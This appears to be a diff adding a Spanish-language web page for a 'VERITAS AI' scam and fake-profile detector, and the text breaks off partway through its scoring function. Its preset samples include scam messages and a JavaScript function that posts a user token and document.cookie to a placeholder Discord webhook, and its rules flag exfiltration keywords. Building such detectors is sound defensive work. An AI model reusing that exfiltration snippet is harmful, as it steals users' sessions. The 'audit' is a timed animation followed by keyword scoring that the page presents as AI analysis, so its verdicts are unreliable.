@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="es" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VERITAS AI - Detector Universal de Autenticidad, Datos e Impostores</title>
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800;900&family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <!-- Chart.js -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        cyber: {
+                            bg: '#05070D',
+                            card: '#0B0F19',
+                            cardHover: '#121828',
+                            border: '#1E293B',
+                            cyan: '#00F0FF',
+                            cyanGlow: 'rgba(0, 240, 255, 0.25)',
+                            violet: '#8A2BE2',
+                            purpleGlow: 'rgba(138, 43, 226, 0.25)',
+                            amber: '#FFB800',
+                            danger: '#FF0055',
+                            emerald: '#00FF87'
+                        }
+                    },
+                    fontFamily: {
+                        orbitron: ['Orbitron', 'sans-serif'],
+                        sans: ['Plus Jakarta Sans', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        /* Cyberpunk Custom Effects */
+        .neon-border-cyan {
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.2), inset 0 0 15px rgba(0, 240, 255, 0.1);
+            border-color: rgba(0, 240, 255, 0.5);
+        }
+        .neon-border-violet {
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.25), inset 0 0 15px rgba(138, 43, 226, 0.1);
+            border-color: rgba(138, 43, 226, 0.5);
+        }
+        .neon-border-danger {
+            box-shadow: 0 0 20px rgba(255, 0, 85, 0.3);
+            border-color: rgba(255, 0, 85, 0.6);
+        }
+        .neon-text-cyan {
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.6);
+        }
+        .neon-text-violet {
+            text-shadow: 0 0 10px rgba(138, 43, 226, 0.6);
+        }
+        
+        /* Scanline Overlay */
+        .scanline-bg {
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0, 240, 255, 0.03) 50%,
+                rgba(0, 240, 255, 0.03)
+            );
+            background-size: 100% 4px;
+        }
+
+        /* Radar Scanner Animation */
+        @keyframes radar-sweep {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .radar-sweep {
+            animation: radar-sweep 2.5s linear infinite;
+        }
+
+        @keyframes pulse-fast {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+        .animate-pulse-fast {
+            animation: pulse-fast 1s ease-in-out infinite;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #05070D;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1E293B;
+            border-radius: 9999px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00F0FF;
+        }
+    </style>
+</head>
+<body class="bg-cyber-bg text-slate-100 font-sans min-h-screen antialiased selection:bg-cyber-cyan selection:text-black scanline-bg relative overflow-x-hidden">
+
+    <!-- HUD GRID BACKGROUND -->
+    <div class="fixed inset-0 bg-[linear-gradient(to_right,#1e293b10_1px,transparent_1px),linear-gradient(to_bottom,#1e293b10_1px,transparent_1px)] bg-[size:4rem_4rem] pointer-events-none z-0"></div>
+
+    <!-- MAIN APP WRAPPER -->
+    <div class="relative z-10 flex flex-col min-h-screen">
+
+        <!-- HEADER -->
+        <header class="border-b border-cyber-border bg-cyber-card/80 backdrop-blur-xl sticky top-0 z-40 px-4 lg:px-8 py-3.5 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-cyber-cyan to-cyber-violet flex items-center justify-center text-black shadow-lg shadow-cyber-cyanGlow">
+                    <i data-lucide="shield-alert" class="w-6 h-6 stroke-[2.5]"></i>
+                </div>
+                <div>
+                    <div class="flex items-center gap-2">
+                        <span class="font-orbitron font-black text-xl tracking-wider text-white">VERITAS <span class="text-cyber-cyan neon-text-cyan">AI</span></span>
+                        <span class="text-[10px] font-mono px-2 py-0.5 rounded bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30">v3.8 CORE</span>
+                    </div>
+                    <p class="text-[11px] font-mono text-slate-400 hidden sm:block">Detector Universal de Autenticidad, Datos e Impostores</p>
+                </div>
+            </div>
+
+            <!-- STATUS & CONTROLS -->
+            <div class="flex items-center gap-3">
+                <!-- Status Badge -->
+                <div class="hidden md:flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-emerald/10 border border-cyber-emerald/30 text-cyber-emerald text-xs font-mono font-semibold">
+                    <span class="w-2 h-2 rounded-full bg-cyber-emerald animate-pulse-fast"></span>
+                    <span>SISTEMA ACTIVO</span>
+                </div>
+
+                <!-- Sound FX Toggle -->
+                <button onclick="toggleAudio()" id="audioBtn" title="Efectos de Sonido" class="p-2.5 rounded-xl border border-cyber-border bg-cyber-card hover:border-cyber-cyan text-slate-400 hover:text-cyber-cyan transition-all">
+                    <i data-lucide="volume-2" id="audioIcon" class="w-4 h-4"></i>
+                </button>
+
+                <!-- History Drawer Trigger -->
+                <button onclick="toggleHistoryModal()" class="p-2.5 rounded-xl border border-cyber-border bg-cyber-card hover:border-cyber-violet text-slate-400 hover:text-cyber-violet transition-all flex items-center gap-2 text-xs font-mono">
+                    <i data-lucide="history" class="w-4 h-4"></i>
+                    <span class="hidden sm:inline">HISTORIAL</span>
+                </button>
+            </div>
+        </header>
+
+        <!-- MAIN CONTAINER -->
+        <main class="flex-1 max-w-7xl w-full mx-auto p-4 sm:p-6 lg:p-8 space-y-8">
+
+            <!-- HERO INTRO -->
+            <section class="text-center space-y-3 max-w-3xl mx-auto">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-cyber-violet/40 bg-cyber-violet/10 text-cyber-violet text-xs font-mono font-bold">
+                    <i data-lucide="scan-eye" class="w-3.5 h-3.5"></i>
+                    <span>EVALUACIÓN MULTICONTEXTUAL DE VERACIDAD</span>
+                </div>
+                <h1 class="font-orbitron font-extrabold text-2xl sm:text-4xl text-white tracking-tight">
+                    Audita cualquier <span class="bg-gradient-to-r from-cyber-cyan via-indigo-400 to-cyber-violet bg-clip-text text-transparent">Texto, Perfil, Código u Oferta</span>
+                </h1>
+                <p class="text-slate-400 text-xs sm:text-sm">
+                    Detecta contradicciones lógicas, patrones de estafa, probabilidad de bots/IA, manipulación de datos y perfiles falsos en segundos.
+                </p>
+            </section>
+
+            <!-- QUICK PRESETS SCENARIOS -->
+            <section class="space-y-3">
+                <div class="flex items-center justify-between">
+                    <span class="text-xs font-mono uppercase tracking-wider text-slate-400 font-bold flex items-center gap-2">
+                        <i data-lucide="sparkles" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+                        Escenarios Rápidos de Prueba (Haz Clic):
+                    </span>
+                </div>
+                <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
+                    <button onclick="loadPreset('job_scam')" class="p-3.5 rounded-xl border border-cyber-border bg-cyber-card hover:bg-cyber-cardHover hover:border-cyber-cyan text-left transition-all group space-y-1">
+                        <div class="flex items-center justify-between">
+                            <span class="font-mono text-xs font-bold text-cyber-cyan group-hover:underline">Oferta de Trabajo Falsa</span>
+                            <i data-lucide="briefcase" class="w-4 h-4 text-slate-500 group-hover:text-cyber-cyan"></i>
+                        </div>
+                        <p class="text-[11px] text-slate-400 line-clamp-2">"Gana $500 diarios sin experiencia enviando depósitos por Telegram..."</p>
+                    </button>
+
+                    <button onclick="loadPreset('fake_seller')" class="p-3.5 rounded-xl border border-cyber-border bg-cyber-card hover:bg-cyber-cardHover hover:border-cyber-violet text-left transition-all group space-y-1">
+                        <div class="flex items-center justify-between">
+                            <span class="font-mono text-xs font-bold text-cyber-violet group-hover:underline">Vendedor Sospechoso</span>
+                            <i data-lucide="shopping-cart" class="w-4 h-4 text-slate-500 group-hover:text-cyber-violet"></i>
+                        </div>
+                        <p class="text-[11px] text-slate-400 line-clamp-2">"iPhone 15 Pro Max por $200, transfórmame directo, sin comisión..."</p>
+                    </button>
+
+                    <button onclick="loadPreset('social_bot')" class="p-3.5 rounded-xl border border-cyber-border bg-cyber-card hover:bg-cyber-cardHover hover:border-cyber-amber text-left transition-all group space-y-1">
+                        <div class="flex items-center justify-between">
+                            <span class="font-mono text-xs font-bold text-cyber-amber group-hover:underline">Perfil Bot / Fake Social</span>
+                            <i data-lucide="user-x" class="w-4 h-4 text-slate-500 group-hover:text-cyber-amber"></i>
+                        </div>
+                        <p class="text-[11px] text-slate-400 line-clamp-2">Audit de cuenta @crypto_king_9921 con crypto-spam y seguidores comprados.</p>
+                    </button>
+
+                    <button onclick="loadPreset('code_trap')" class="p-3.5 rounded-xl border border-cyber-border bg-cyber-card hover:bg-cyber-cardHover hover:border-cyber-emerald text-left transition-all group space-y-1">
+                        <div class="flex items-center justify-between">
+                            <span class="font-mono text-xs font-bold text-cyber-emerald group-hover:underline">Trampa en Código / Script</span>
+                            <i data-lucide="code" class="w-4 h-4 text-slate-500 group-hover:text-cyber-emerald"></i>
+                        </div>
+                        <p class="text-[11px] text-slate-400 line-clamp-2">Script ejecutable con extracción encubierta de tokens de sesión.</p>
+                    </button>
+                </div>
+            </section>
+
+            <!-- MULTI-INPUT CORE ANALYZER -->
+            <section class="bg-cyber-card border border-cyber-border rounded-2xl overflow-hidden p-5 sm:p-7 space-y-6 shadow-2xl relative">
+                
+                <!-- TABS FOR CONTEXT TYPE -->
+                <div class="flex flex-wrap items-center gap-2 border-b border-cyber-border pb-4">
+                    <button onclick="switchTab('text')" id="tab-btn-text" class="tab-btn px-4 py-2 rounded-xl text-xs font-mono font-bold flex items-center gap-2 transition-all bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/40">
+                        <i data-lucide="file-text" class="w-4 h-4"></i>
+                        <span>Textos & Argumentos</span>
+                    </button>
+                    <button onclick="switchTab('profile')" id="tab-btn-profile" class="tab-btn px-4 py-2 rounded-xl text-xs font-mono font-bold flex items-center gap-2 transition-all text-slate-400 hover:text-white border border-transparent">
+                        <i data-lucide="user-search" class="w-4 h-4"></i>
+                        <span>Perfil & Usuario</span>
+                    </button>
+                    <button onclick="switchTab('code')" id="tab-btn-code" class="tab-btn px-4 py-2 rounded-xl text-xs font-mono font-bold flex items-center gap-2 transition-all text-slate-400 hover:text-white border border-transparent">
+                        <i data-lucide="terminal" class="w-4 h-4"></i>
+                        <span>Código / JSON / Datos</span>
+                    </button>
+                </div>
+
+                <!-- INPUT AREA -->
+                <div class="space-y-3">
+                    <div class="flex justify-between items-center text-xs font-mono text-slate-400">
+                        <span id="inputTabLabel" class="flex items-center gap-1.5">
+                            <i data-lucide="corner-down-right" class="w-3.5 h-3.5 text-cyber-cyan"></i>
+                            Pega el contenido o declaración sospechosa para analizar:
+                        </span>
+                        <span id="charCounter">0 caracteres</span>
+                    </div>
+
+                    <div class="relative">
+                        <textarea id="targetInput" rows="6" oninput="updateCharCounter()" placeholder="Escribe o pega texto, correo, propuesta comercial, enlace de perfil, o código..." class="w-full bg-cyber-bg/90 border border-cyber-border rounded-xl p-4 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyber-cyan focus:ring-1 focus:ring-cyber-cyan transition-all resize-y"></textarea>
+
+                        <!-- Clear Action -->
+                        <button onclick="clearInput()" class="absolute top-3 right-3 p-1.5 text-slate-500 hover:text-slate-300 rounded-lg bg-cyber-card/80 hover:bg-cyber-border transition-colors">
+                            <i data-lucide="x" class="w-4 h-4"></i>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- SCAN ACTION BAR -->
+                <div class="flex flex-col sm:flex-row items-center justify-between gap-4 pt-2">
+                    <div class="flex items-center gap-3 text-xs text-slate-400 font-mono">
+                        <label class="flex items-center gap-2 cursor-pointer">
+                            <input type="checkbox" id="deepScanCheck" checked class="accent-cyber-cyan rounded">
+                            <span>Deep-Scan Multicapa (Análisis Lógico + Sintáctico)</span>
+                        </label>
+                    </div>
+
+                    <button onclick="runAudit()" id="scanBtn" class="w-full sm:w-auto px-8 py-3.5 rounded-xl bg-gradient-to-r from-cyber-cyan to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-black font-orbitron font-extrabold text-xs tracking-wider shadow-lg shadow-cyber-cyanGlow hover:shadow-cyan-500/40 transition-all flex items-center justify-center gap-2">
+                        <i data-lucide="cpu" class="w-4 h-4 stroke-[3]"></i>
+                        <span>INICIAR AUDITORÍA DE VERACIDAD</span>
+                    </button>
+                </div>
+
+            </section>
+
+            <!-- INTERACTIVE SCANNER RADAR SCREEN (HIDDEN BY DEFAULT) -->
+            <section id="scannerScreen" class="hidden bg-cyber-card border border-cyber-cyan/40 rounded-2xl p-8 text-center space-y-6 shadow-2xl relative overflow-hidden">
+                <div class="absolute inset-0 bg-cyber-cyan/5 pointer-events-none"></div>
+
+                <!-- RADAR GRAPHIC -->
+                <div class="relative w-32 h-32 mx-auto flex items-center justify-center">
+                    <div class="absolute inset-0 rounded-full border border-cyber-cyan/30"></div>
+                    <div class="absolute inset-3 rounded-full border border-cyber-cyan/20"></div>
+                    <div class="absolute inset-8 rounded-full border border-cyber-cyan/10"></div>
+                    <div class="w-full h-full rounded-full border-2 border-cyber-cyan/60 relative overflow-hidden">
+                        <div class="radar-sweep absolute top-1/2 left-1/2 w-16 h-16 bg-gradient-to-tl from-cyber-cyan/50 to-transparent origin-top-left -mt-0.5 -ml-0.5"></div>
+                    </div>
+                    <i data-lucide="radar" class="w-8 h-8 text-cyber-cyan absolute animate-pulse"></i>
+                </div>
+
+                <!-- PROGRESS METER -->
+                <div class="max-w-md mx-auto space-y-2">
+                    <div class="flex justify-between text-xs font-mono font-bold">
+                        <span id="scanStatusText" class="text-cyber-cyan">INICIALIZANDO MOTOR VERITAS...</span>
+                        <span id="scanPercentText" class="text-white">0%</span>
+                    </div>
+                    <div class="w-full h-2.5 bg-cyber-bg rounded-full overflow-hidden border border-cyber-border">
+                        <div id="progressBar" class="h-full bg-gradient-to-r from-cyber-cyan via-indigo-500 to-cyber-violet w-0 transition-all duration-300"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- DIAGNOSTIC OUTPUT & VERDICT DASHBOARD (HIDDEN BY DEFAULT) -->
+            <section id="resultDashboard" class="hidden space-y-6">
+
+                <!-- OVERVIEW HEADER CARDS -->
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+
+                    <!-- GAUGE CARD (AUTH SCORE) -->
+                    <div class="lg:col-span-5 bg-cyber-card border border-cyber-border rounded-2xl p-6 flex flex-col items-center justify-center space-y-4 shadow-xl relative overflow-hidden">
+                        <div class="text-center">
+                            <span class="text-xs font-mono uppercase tracking-wider text-slate-400 font-bold">Índice de Autenticidad</span>
+                            <p class="text-[11px] text-slate-500 font-mono">Veracidad calculada en base a patrones lógicos</p>
+                        </div>
+
+                        <!-- Radial Gauge Chart -->
+                        <div class="relative w-44 h-44 flex items-center justify-center">
+                            <canvas id="gaugeChart"></canvas>
+                            <div class="absolute inset-0 flex flex-col items-center justify-center text-center">
+                                <span id="authScoreDisplay" class="font-orbitron font-black text-3xl text-white">0%</span>
+                                <span id="authScoreSub" class="text-[10px] font-mono text-slate-400">VERACIDAD</span>
+                            </div>
+                        </div>
+
+                        <!-- Threat Level Badge -->
+                        <div id="threatBadge" class="px-4 py-2 rounded-xl text-xs font-orbitron font-bold tracking-wider flex items-center gap-2 border">
+                            <!-- Populated dynamically -->
+                        </div>
+                    </div>
+
+                    <!-- EXECUTIVE VERDICT SUMMARY -->
+                    <div class="lg:col-span-7 bg-cyber-card border border-cyber-border rounded-2xl p-6 flex flex-col justify-between space-y-4 shadow-xl">
+                        <div class="space-y-3">
+                            <div class="flex items-center justify-between border-b border-cyber-border pb-3">
+                                <div class="flex items-center gap-2">
+                                    <i data-lucide="cpu" class="w-4 h-4 text-cyber-cyan"></i>
+                                    <h3 class="font-orbitron font-bold text-sm text-white">Dictamen Ejecutivo de Veritas AI</h3>
+                                </div>
+                                <span id="timestampBadge" class="text-[10px] font-mono text-slate-500">HOY 14:32:05</span>
+                            </div>
+
+                            <p id="executiveSummary" class="text-xs sm:text-sm text-slate-300 leading-relaxed font-sans">
+                                <!-- Populated dynamically -->
+                            </p>
+                        </div>
+
+                        <!-- RECOMMENDED ACTION BOX -->
+                        <div class="p-3.5 rounded-xl bg-cyber-bg border border-cyber-border space-y-1">
+                            <span class="text-[11px] font-mono text-cyber-cyan font-bold uppercase flex items-center gap-1.5">
+                                <i data-lucide="shield-check" class="w-3.5 h-3.5"></i> Acciones Recomendadas:
+                            </span>
+                            <p id="recommendedActions" class="text-xs text-slate-400">
+                                <!-- Populated dynamically -->
+                            </p>
+                        </div>
+
+                        <!-- EXPORT & ACTIONS -->
+                        <div class="flex flex-wrap items-center justify-between gap-3 pt-2">
+                            <button onclick="exportReport()" class="px-4 py-2 rounded-xl border border-cyber-border bg-cyber-card hover:bg-cyber-cardHover text-xs font-mono text-slate-300 hover:text-white transition-all flex items-center gap-2">
+                                <i data-lucide="download" class="w-4 h-4 text-cyber-cyan"></i>
+                                <span>Exportar Reporte (TXT/PDF)</span>
+                            </button>
+                            <button onclick="resetAnalyzer()" class="px-4 py-2 rounded-xl bg-cyber-border hover:bg-slate-700 text-xs font-mono text-white transition-all">
+                                Nueva Auditoría
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- RED FLAGS & GREEN FLAGS DETAILED BREAKDOWN -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+
+                    <!-- RED FLAGS (PUNTOS SOSPECHOSOS) -->
+                    <div class="bg-cyber-card border border-cyber-border rounded-2xl p-6 space-y-4 shadow-xl">
+                        <div class="flex items-center justify-between border-b border-cyber-border pb-3">
+                            <div class="flex items-center gap-2 text-cyber-danger">
+                                <i data-lucide="alert-triangle" class="w-5 h-5"></i>
+                                <h4 class="font-orbitron font-bold text-xs uppercase tracking-wider text-white">Anomalías y Puntos Sospechosos</h4>
+                            </div>
+                            <span id="redFlagCount" class="px-2 py-0.5 rounded bg-cyber-danger/10 text-cyber-danger border border-cyber-danger/30 text-xs font-mono font-bold">0</span>
+                        </div>
+
+                        <div id="redFlagsList" class="space-y-2.5">
+                            <!-- Dynamic Content -->
+                        </div>
+                    </div>
+
+                    <!-- GREEN FLAGS (PUNTOS CONFIABLES) -->
+                    <div class="bg-cyber-card border border-cyber-border rounded-2xl p-6 space-y-4 shadow-xl">
+                        <div class="flex items-center justify-between border-b border-cyber-border pb-3">
+                            <div class="flex items-center gap-2 text-cyber-emerald">
+                                <i data-lucide="check-circle-2" class="w-5 h-5"></i>
+                                <h4 class="font-orbitron font-bold text-xs uppercase tracking-wider text-white">Indicadores de Confianza y Coherencia</h4>
+                            </div>
+                            <span id="greenFlagCount" class="px-2 py-0.5 rounded bg-cyber-emerald/10 text-cyber-emerald border border-cyber-emerald/30 text-xs font-mono font-bold">0</span>
+                        </div>
+
+                        <div id="greenFlagsList" class="space-y-2.5">
+                            <!-- Dynamic Content -->
+                        </div>
+                    </div>
+
+                </div>
+
+            </section>
+
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="border-t border-cyber-border bg-cyber-card/60 py-4 px-6 text-center text-xs font-mono text-slate-500">
+            VERITAS AI Engine &copy; 2026 - Herramienta Avanzada para la Detección de Fraude, Fake News e Impostores en Línea.
+        </footer>
+    </div>
+
+    <!-- HISTORY MODAL DRAWER -->
+    <div id="historyModal" class="fixed inset-0 z-50 hidden bg-black/80 backdrop-blur-md flex justify-end">
+        <div class="w-full max-w-md bg-cyber-card border-l border-cyber-border h-full p-6 space-y-6 flex flex-col justify-between overflow-y-auto">
+            <div class="space-y-4">
+                <div class="flex justify-between items-center border-b border-cyber-border pb-4">
+                    <div class="flex items-center gap-2 text-cyber-cyan">
+                        <i data-lucide="history" class="w-5 h-5"></i>
+                        <h3 class="font-orbitron font-bold text-sm text-white">Historial de Auditorías</h3>
+                    </div>
+                    <button onclick="toggleHistoryModal()" class="text-slate-400 hover:text-white">
+                        <i data-lucide="x" class="w-5 h-5"></i>
+                    </button>
+                </div>
+
+                <div id="historyList" class="space-y-3">
+                    <!-- Populated dynamically -->
+                </div>
+            </div>
+
+            <button onclick="clearHistory()" class="w-full py-2.5 rounded-xl border border-cyber-danger/30 text-cyber-danger hover:bg-cyber-danger/10 text-xs font-mono font-bold transition-colors">
+                Limpiar Historial
+            </button>
+        </div>
+    </div>
+
+    <!-- TOAST NOTIFICATION CONTAINER -->
+    <div id="toastContainer" class="fixed bottom-5 right-5 z-50 flex flex-col gap-2 pointer-events-none"></div>
+
+    <!-- AUDIO EFFECTS USING WEB AUDIO API -->
+    <script>
+        let audioEnabled = true;
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        function playBeep(freq = 440, type = 'sine', duration = 0.1) {
+            if (!audioEnabled) return;
+            try {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                gain.gain.setValueAtTime(0.05, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {}
+        }
+
+        function toggleAudio() {
+            audioEnabled = !audioEnabled;
+            const icon = document.getElementById('audioIcon');
+            icon.setAttribute('data-lucide', audioEnabled ? 'volume-2' : 'volume-x');
+            lucide.createIcons();
+            showToast(audioEnabled ? 'Sonido activado' : 'Sonido desactivado');
+        }
+    </script>
+
+    <!-- APP CORE LOGIC -->
+    <script>
+        // STATE VARIABLES
+        let currentTab = 'text';
+        let scanHistory = JSON.parse(localStorage.getItem('veritas_history') || '[]');
+        let gaugeChartInstance = null;
+        let lastAnalysisResult = null;
+
+        // PRESETS DATA
+        const PRESETS = {
+            job_scam: {
+                tab: 'text',
+                content: `¡OFERTA DE TRABAJO URGENTE! Gana $500 a $1200 USD diarios trabajando desde casa solo 2 horas al día. No requerimos experiencia ni entrevista. Para empezar hoy mismo debes enviar un pago de inscripción de $25 USD vía USDT/Crypto o Western Union para liberar tu kit de trabajo. Contáctanos inmediatamente por Telegram @CryptoJobFast.`
+            },
+            fake_seller: {
+                tab: 'profile',
+                content: `Perfil de Vendedor: @iphone_cheap_deals_official
+Seguidores: 45,200 | Siguiendo: 12
+Bio: Tienda Oficial de iPhones Importados directos de fábrica sin impuestos.
+Publicación: "Apple iPhone 15 Pro Max 512GB Nuevo Sellado por solo $250 USD. Solo pago por transferencia bancaria directa o Zelle antes del envío. No aceptamos PayPal ni pago contra entrega por políticas de aduana."`
+            },
+            social_bot: {
+                tab: 'profile',
+                content: `Nombre de usuario: @crypto_guru_x99281
+Cuenta creada: Hace 4 días
+Publicaciones: 340 tweets en las últimas 24 horas.
+Contenido recurrente: "¡Increíble! Gané $10,000 en 2 horas con el bot de trading de Mr. Smith. Escríbele al WhatsApp +234-80-XXXXXX para duplicar tu dinero garantizado 100% sin riesgo."`
+            },
+            code_trap: {
+                tab: 'code',
+                content: `function processPayment(userToken) {
+    // Legitimate checkout simulation
+    console.log("Processing order...");
+    
+    // SUSPICIOUS HIDDEN CALL:
+    const exfilUrl = "https://discord.com/api/webhooks/123456789/xyz_fake_endpoint";
+    fetch(exfilUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: userToken, cookies: document.cookie })
+    });
+    
+    return { status: 200, success: true };
+}`
+            }
+        };
+
+        // TAB SWITCHING
+        function switchTab(tab) {
+            currentTab = tab;
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.className = 'tab-btn px-4 py-2 rounded-xl text-xs font-mono font-bold flex items-center gap-2 transition-all text-slate-400 hover:text-white border border-transparent';
+            });
+
+            const activeBtn = document.getElementById(`tab-btn-${tab}`);
+            activeBtn.className = 'tab-btn px-4 py-2 rounded-xl text-xs font-mono font-bold flex items-center gap-2 transition-all bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/40';
+
+            const labels = {
+                text: 'Pega el texto, correo, propuesta o declaración sospechosa:',
+                profile: 'Pega los datos del perfil, nombre de usuario o publicación del vendedor:',
+                code: 'Pega el snippet de código, JSON o script a inspeccionar:'
+            };
+            document.getElementById('inputTabLabel').innerHTML = `<i data-lucide="corner-down-right" class="w-3.5 h-3.5 text-cyber-cyan"></i> ${labels[tab]}`;
+            lucide.createIcons();
+        }
+
+        // INPUT CHAR COUNTER
+        function updateCharCounter() {
+            const txt = document.getElementById('targetInput').value;
+            document.getElementById('charCounter').innerText = `${txt.length} caracteres`;
+        }
+
+        function clearInput() {
+            document.getElementById('targetInput').value = '';
+            updateCharCounter();
+        }
+
+        // LOAD PRESET
+        function loadPreset(presetKey) {
+            const preset = PRESETS[presetKey];
+            if (!preset) return;
+
+            switchTab(preset.tab);
+            document.getElementById('targetInput').value = preset.content;
+            updateCharCounter();
+            playBeep(600, 'sine', 0.1);
+            showToast('Escenario cargado exitosamente');
+        }
+
+        // RUN AUDIT SIMULATION
+        function runAudit() {
+            const inputTxt = document.getElementById('targetInput').value.trim();
+            if (!inputTxt) {
+                showToast('Por favor introduce algún texto o datos para analizar', 'warning');
+                playBeep(200, 'square', 0.2);
+                return;
+            }
+
+            // Hide previous UI, Show Scanner Radar
+            document.getElementById('resultDashboard').classList.add('hidden');
+            document.getElementById('scannerScreen').classList.remove('hidden');
+
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            const percentText = document.getElementById('scanPercentText');
+            const statusText = document.getElementById('scanStatusText');
+
+            const steps = [
+                "Iniciando análisis léxico y sintáctico...",
+                "Buscando incongruencias lógicas y paradojas...",
+                "Evaluando patrones de estafa y manipulación...",
+                "Verificando sesgos de Inteligencia Artificial / Bot...",
+                "Generando índice global de veracidad..."
+            ];
+
+            playBeep(800, 'triangle', 0.15);
+
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = `${progress}%`;
+                percentText.innerText = `${progress}%`;
+
+                const stepIdx = Math.min(Math.floor((progress / 100) * steps.length), steps.length - 1);
+                statusText.innerText = steps[stepIdx];
+
+                if (progress % 20 === 0) {
+                    playBeep(500 + progress * 4, 'sine', 0.05);
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        document.getElementById('scannerScreen').classList.add('hidden');
+                        generateDiagnostic(inputTxt);
+                    }, 400);
+                }
+            }, 80);
+        }
+
+        // GENERATE HEURISTIC DIAGNOSTIC
+        function generateDiagnostic(text) {
+            const lower = text.toLowerCase();
+            let redFlags = [];
+            let greenFlags = [];
+            let score = 85; // Base default trust score
+
+            // HEURISTIC CHECKS (SCAM / FRAUD / BOTS / CODE / CONTRADICTIONS)
+            
+            // Check 1: Financial & Urgency Traps
+            if (lower.includes('gana') || lower.includes('usd') || lower.includes('dólares') || lower.includes('cripto') || lower.includes('usdt') || lower.includes('garantizado')) {
+                if (lower.includes('urgente') || lower.includes('hoy mismo') || lower.includes('sin experiencia') || lower.includes('depósito') || lower.includes('pago')) {
+                    redFlags.push({
+                        title: "Promesa Financiera Irreal / Alta Urgencia",
+                        desc: "Promesas de ganancias elevadas combinadas con presión de tiempo y solicitud de dinero previo.",
+                        severity: "CRÍTICO"
+                    });
+                    score -= 40;
+                }
+            }
+
+            // Check 2: Unsafe Payment / Contact Channels
+            if (lower.includes('telegram') || lower.includes('whatsapp') || lower.includes('zelle') || lower.includes('western union') || lower.includes('sin comisión')) {
+                redFlags.push({
+                    title: "Canales de Pago no Protegidos",
+                    desc: "Uso de métodos ireversibles de pago o migración de la conversación fuera de plataformas reguladas.",
+                    severity: "ALTO"
+                });
+                score -= 25;
+            }
+
+            // Check 3: Code Traps & Suspicious Exfiltration
+            if (currentTab === 'code' || lower.includes('fetch(') || lower.includes('webhook') || lower.includes('cookie')) {
+                if (lower.includes('webhook') || lower.includes('token') || lower.includes('discord')) {
+                    redFlags.push({
+                        title: "Posible Extracción / Exfiltración de Credenciales",
+                        desc: "Lógica detectada que envía tokens o cookies a servidores de terceros no autorizados.",
+                        severity: "CRÍTICO"
+                    });
+                    score -= 50;
+                }
+            }
+
+            // Check 4: Bot & Spam Behavior
+            if (lower.includes('tweets') || lower.includes('seguidores') || lower.includes('sin riesgo') || lower.includes('duplicar tu dinero')) {
+                redFlags.push({
+                    title: "Patrón de Granja de Bots / Spam Automático",
+                    desc: "Alta frecuencia de mensajes idénticos y estructura típica de cuentas automatizadas.",
+                    severity: "ALTO"
+                });
+                score -= 30;
+            }
+
+            // Green Flags Evaluation
+            if (!lower.includes('urgente') && !lower.includes('transferencia directa')) {
+                greenFlags.push({
+                    title: "Tono Neutro y Coherente",
+                    desc: "No presenta manipulación emocional ni lenguaje coercitivo excesivo."
+                });
+            }
+
+            if (text.length > 50) {
+                greenFlags.push({
+                    title: "Estructura Sintáctica Completa",
+                    desc: "Contenido con nivel articulado de oraciones y puntuación legible."
+                });
+            }
+
